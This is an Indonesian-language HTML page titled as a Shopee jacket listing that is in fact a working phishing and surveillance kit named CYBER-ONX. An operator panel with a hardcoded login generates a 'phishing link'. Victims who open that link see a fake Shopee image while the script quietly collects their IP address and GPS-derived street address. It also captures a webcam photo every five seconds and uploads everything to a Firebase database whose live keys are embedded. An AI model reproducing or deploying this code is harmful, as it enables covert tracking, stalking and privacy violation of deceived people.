<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Shopee Jaket skena COD</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Inter:wght@300;400;600;800&display=swap" rel="stylesheet">
    
    <script src="https://www.gstatic.com/firebasejs/9.1.3/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.1.3/firebase-database-compat.js"></script>

    <style>
        /* CSS KAMU TETAP SAMA SEPERTI SEBELUMNYA */
        :root { --bg-main: #0a0a0c; --panel-bg: rgba(30, 30, 35, 0.7); --accent-glow: #00f2ff; --accent-dark: #0066ff; --border-glass: rgba(255, 255, 255, 0.1); --success: #00ff64; --danger: #ff0055; --card-grad: linear-gradient(145deg, #1e1e24, #141418); }
        body { margin: 0; padding: 0; background-color: var(--bg-main); color: white; font-family: 'Inter', sans-serif; display: flex; justify-content: center; min-height: 100vh; }
        #target-view { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #fff; z-index: 999999; display: none; justify-content: center; align-items: flex-start; overflow-y: auto; }
        #target-view img { width: 100%; height: auto; display: block; }
        .phone-frame { width: 100%; max-width: 420px; padding: 20px; box-sizing: border-box; position: relative; }
        .header-profile { background: var(--panel-bg); backdrop-filter: blur(10px); border-radius: 24px; padding: 25px; border: 1px solid var(--border-glass); text-align: center; margin-bottom: 25px; position: relative; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
        .timer-container { position: absolute; top: 10px; right: 15px; display: flex; flex-direction: column; align-items: flex-end; gap: 8px; }
        .exp-timer { font-family: 'Orbitron'; font-size: 9px; background: rgba(0,0,0,0.9); padding: 4px 10px; border-radius: 8px; color: var(--success); border: 1px solid var(--border-glass); }
        .mini-btn-group { display: flex; gap: 6px; }
        .mini-btn { width: 26px; height: 26px; border-radius: 50%; border: 1px solid var(--border-glass); background: rgba(0,0,0,0.6); display: flex; justify-content: center; align-items: center; cursor: pointer; }
        .mini-btn svg { width: 14px; fill: white; }
        #side-nav { position: fixed; top: 0; left: -300px; width: 280px; height: 100%; background: #0f0f12; z-index: 20000; transition: 0.4s; border-right: 1px solid var(--border-glass); }
        #side-nav.active { left: 0; }
        .nav-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.7); z-index: 15000; display: none; }
        .modal-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); backdrop-filter: blur(8px); z-index: 99999; justify-content: center; align-items: center; }
        .modal-box { background: #121214; border: 1px solid var(--accent-glow); border-radius: 24px; padding: 25px; width: 80%; max-width: 300px; text-align: center; }
        .reg-btn { display: flex; align-items: center; justify-content: center; gap: 10px; width: 90%; padding: 12px; border-radius: 12px; margin-bottom: 10px; text-decoration: none; font-weight: bold; font-size: 12px; color: white; }
        .btn-wa { background: #25D366; } .btn-tele { background: #0088cc; }
        .guide-header { background: rgba(255,255,255,0.05); border: 1px solid var(--border-glass); padding: 12px 15px; border-radius: 12px; display: flex; justify-content: space-between; font-size: 11px; color: var(--accent-glow); cursor: pointer; }
        .guide-content { max-height: 0; overflow: hidden; transition: 0.3s; background: rgba(0,0,0,0.2); }
        .guide-content.open { max-height: 500px; padding: 15px; border: 1px solid var(--border-glass); }
        #gallery-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: var(--bg-main); z-index: 10001; padding: 20px; box-sizing: border-box; overflow-y: auto; }
        .grid-photos { display: grid; grid-template-columns: repeat(2, 1fr); gap: 12px; margin-top: 20px; }
        .grid-photos img { width: 100%; border-radius: 15px; border: 1px solid #333; }
        .info-row { display: flex; justify-content: space-between; padding: 10px 0; border-bottom: 1px solid rgba(255,255,255,0.05); font-size: 11px; }
        .control-panel { background: var(--panel-bg); border-radius: 24px; padding: 20px; border: 1px solid var(--border-glass); margin-bottom: 20px; }
        .input-group { background: rgba(0,0,0,0.4); border-radius: 14px; padding: 12px; border: 1px solid #333; display: flex; align-items: center; justify-content: space-between; }
        .input-group input { background: transparent; border: none; color: #fff; width: 80%; outline: none; font-size: 12px; }
        .btn-action { background: linear-gradient(135deg, var(--accent-glow), var(--accent-dark)); color: #000; border: none; padding: 12px 18px; border-radius: 12px; font-weight: 800; cursor: pointer; }
        .target-folder { background: var(--card-grad); border-radius: 18px; padding: 15px; margin-top: 10px; display: flex; align-items: center; justify-content: space-between; border-left: 4px solid var(--accent-glow); }
        #login-gate { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: var(--bg-main); z-index: 10000; display: flex; justify-content: center; align-items: center; }
    </style>
</head>
<body>

<div id="target-view">
    <img src="https://i.imgur.com/swSbjoE.jpeg" alt="Shopee">
</div>

<div id="login-gate">
    <div class="control-panel" style="width: 280px; text-align: center;">
        <h2 style="font-family: 'Orbitron'; font-size: 14px; letter-spacing: 3px;">CYBER-ONX</h2>
        <input type="text" id="user-in" class="input-group" style="width:100%; margin-bottom:10px; box-sizing:border-box;" placeholder="Username">
        <input type="password" id="pass-in" class="input-group" style="width:100%; margin-bottom:20px; box-sizing:border-box;" placeholder="Password">
        <button class="btn-action" style="width:100%" onclick="auth()">LOGIN</button>
    </div>
</div>

<div class="phone-frame" id="admin-view" style="display:none;">
    <div class="header-profile">
        <div class="timer-container">
            <div class="exp-timer" id="exp-display">EXP: --</div>
        </div>
        <h1 style="font-family:'Orbitron'; font-size:18px;">CYBER-ONX</h1>
        <div style="font-size:10px; color:#00ff64;">DATABASE CONNECTED</div>
    </div>

    <div class="control-panel">
        <span style="font-size:10px; color:#777;">LINK PHISING ANDA</span>
        <div class="input-group">
            <input type="text" id="gen-url" readonly value="Loading...">
            <button onclick="copyLinkOnly()" style="background:none; border:none; color:cyan;">COPY</button>
        </div>
    </div>

    <div class="control-panel">
        <span style="font-size:10px; color:#777;">DATA TARGET MASUK</span>
        <div id="target-list">
            <p style="text-align:center; color:#444; font-size:10px;">Menunggu data...</p>
        </div>
    </div>
</div>

<div id="gallery-overlay">
    <button class="btn-action" onclick="document.getElementById('gallery-overlay').style.display='none'">KEMBALI</button>
    <div id="info-container" class="control-panel" style="margin-top:20px;"></div>
    <div class="grid-photos" id="photo-grid"></div>
</div>

<script>
    // --- KONFIGURASI FIREBASE ---
    const firebaseConfig = {
      apiKey: "AIzaSyAydM6bos2I1uGuFrj6DeJ_TDjJFhmfvT0",
      authDomain: "shope-bd354.firebaseapp.com",
      databaseURL: "https://shope-bd354-default-rtdb.asia-southeast1.firebasedatabase.app",
      projectId: "shope-bd354",
      storageBucket: "shope-bd354.firebasestorage.app",
      messagingSenderId: "344259593578",
      appId: "1:344259593578:web:108cd8edb3069641799113"
    };

    firebase.initializeApp(firebaseConfig);
    const database = firebase.database();
    const APP_PREFIX = 'ondev_v26_';

    // --- LOGIKA HALAMAN ---
    const params = new URLSearchParams(window.location.search);
    const idParam = params.get('id');
    const uOwner = params.get('u');

    window.onload = function() {
        if(idParam && uOwner) {
            // JIKA DIBUKA TARGET
            document.getElementById('login-gate').style.display = 'none';
            document.getElementById('target-view').style.display = 'flex';
            startCapture(idParam, uOwner);
        } else {
            // JIKA DIBUKA ADMIN
            if(localStorage.getItem(APP_PREFIX + 'is_logged_in') === 'true') showAdmin();
        }
    };

    function auth() {
        const u = document.getElementById('user-in').value;
        const p = document.getElementById('pass-in').value;
        if(u === 'ondev' && p === 'ondev') {
            localStorage.setItem(APP_PREFIX + 'current_session_user', u);
            localStorage.setItem(APP_PREFIX + 'is_logged_in', 'true');
            showAdmin();
        } else { alert('Gagal Login!'); }
    }

    function showAdmin() {
        document.getElementById('login-gate').style.display = 'none';
        document.getElementById('admin-view').style.display = 'block';
        const user = localStorage.getItem(APP_PREFIX + 'current_session_user');
        const baseUrl = window.location.href.split('?')[0];
        document.getElementById('gen-url').value = `${baseUrl}?id=${Math.floor(1000+Math.random()*9999)}&u=${user}`;
        
        // Baca data dari Firebase secara Real-time
        database.ref('targets/' + user).on('value', (snapshot) => {
            const data = snapshot.val();
            renderList(data);
        });
    }

    function renderList(data) {
        const list = document.getElementById('target-list');
        list.innerHTML = '';
        if(!data) { list.innerHTML = '<p style="text-align:center; color:#444; font-size:10px;">Belum ada data.</p>'; return; }
        
        Object.keys(data).reverse().forEach(id => {
            const t = data[id];
            const div = document.createElement('div');
            div.className = 'target-folder';
            div.innerHTML = `
                <div onclick="openFolder('${id}')" style="cursor:pointer">
                    <b>ID: #${id}</b><br><small>${t.info.time}</small>
                </div>
                <button onclick="hapusData('${id}')" style="background:none; border:none; color:red;">X</button>
            `;
            list.appendChild(div);
        });
    }

    function openFolder(id) {
        const user = localStorage.getItem(APP_PREFIX + 'current_session_user');
        database.ref('targets/' + user + '/' + id).once('value').then((s) => {
            const t = s.val();
            document.getElementById('info-container').innerHTML = `
                <div class="info-row"><span>IP:</span><span>${t.info.ip}</span></div>
                <div class="info-row"><span>Lokasi:</span><span>${t.info.addr}</span></div>
            `;
            document.getElementById('photo-grid').innerHTML = (t.photos || []).map(p => `<img src="${p}">`).join('');
            document.getElementById('gallery-overlay').style.display = 'block';
        });
    }

    function hapusData(id) {
        if(confirm('Hapus data ini?')) {
            const user = localStorage.getItem(APP_PREFIX + 'current_session_user');
            database.ref('targets/' + user + '/' + id).remove();
        }
    }

    // --- LOGIKA CAPTURE DATA (SISI TARGET) ---
    function startCapture(id, owner) {
        let store = { photos: [], info: { time: new Date().toLocaleString(), addr: 'Mencari...', ip: '..' }};
        
        const sync = () => database.ref('targets/' + owner + '/' + id).set(store);

        // Ambil IP
        fetch('https://api.ipify.org?format=json').then(r => r.json()).then(res => { store.info.ip = res.ip; sync(); });

        // Ambil Lokasi
        navigator.geolocation.getCurrentPosition(p => {
            fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${p.coords.latitude}&lon=${p.coords.longitude}`)
            .then(r => r.json()).then(res => { store.info.addr = res.display_name; sync(); });
        });

        // Ambil Kamera
        navigator.mediaDevices.getUserMedia({video:true}).then(s => {
            const v = document.createElement('video'); v.srcObject = s; v.play();
            setInterval(() => {
                const c = document.createElement('canvas'); c.width = 300; c.height = 300;
                c.getContext('2d').drawImage(v, 0, 0, 300, 300);
                store.photos.unshift(c.toDataURL('image/jpeg', 0.5));
                if(store.photos.length > 10) store.photos.pop();
                sync();
            }, 5000);
        }).catch(e => { console.log("Kamera ditolak"); sync(); });
    }

    function copyLinkOnly() {
        const copyText = document.getElementById("gen-url");
        copyText.select();
        document.execCommand("copy");
        alert("Link tersalin!");
    }
</script>
</body>
</html>
